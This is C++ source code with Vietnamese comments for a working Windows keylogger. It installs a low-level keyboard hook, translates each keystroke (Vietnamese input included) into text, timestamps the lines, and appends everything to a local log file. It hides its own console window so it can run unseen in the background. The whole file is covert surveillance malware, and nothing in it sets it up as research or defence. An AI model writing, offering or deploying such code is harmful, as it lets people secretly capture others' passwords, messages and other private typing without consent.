#include <Windows.h>
#include <fstream>
#include <string>
#include <ctime>
#include <codecvt>
#include <locale>

std::wofstream logFile;

// Ghi thời gian hiện tại
void writeTime() {
    time_t now = time(0);
    tm local;
    localtime_s(&local, &now);
    wchar_t buffer[80];
    wcsftime(buffer, 80, L"\n[%Y-%m-%d %H:%M:%S] ", &local);
    logFile << buffer;
}

// Hàm xử lý bàn phím
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        wchar_t key[10] = {0};
        UINT scanCode = p->scanCode;
        HKL layout = GetKeyboardLayout(0);

        std::wstring result;

        // Xử lý các phím đặc biệt
        switch (p->vkCode) {
            case VK_SPACE: result = L" "; break;
            case VK_RETURN: result = L"[ENTER]\n"; writeTime(); break;
            case VK_BACK: result = L"[BACKSPACE]"; break;
            case VK_TAB: result = L"[TAB]"; break;
            case VK_ESCAPE: result = L"[ESC]"; break;
            case VK_SHIFT: result = L"[SHIFT]"; break;
            case VK_CONTROL: result = L"[CTRL]"; break;
            case VK_MENU: result = L"[ALT]"; break;
            case VK_CAPITAL: result = L"[CAPSLOCK]"; break;
            default: {
                int len = ToUnicodeEx(p->vkCode, scanCode, keyboardState, key, 10, 0, layout);
                if (len > 0) {
                    result = std::wstring(key, len);
                } else if (len == -1) {
                    // Dead key (ví dụ: dấu huyền `)
                    result = L"";
                } else {
                    result = L"[UNK_" + std::to_wstring(p->vkCode) + L"]";
                }
            }
        }

        logFile << result;
        logFile.flush();
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Ghi UTF-8 BOM để mở bằng Notepad không lỗi tiếng Việt
    logFile.open("log_unicode.txt", std::ios::app);
    logFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));

    // Ẩn cửa sổ
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Hook bàn phím
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // Vòng lặp chạy ngầm
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    logFile.close();
    return 0;
}
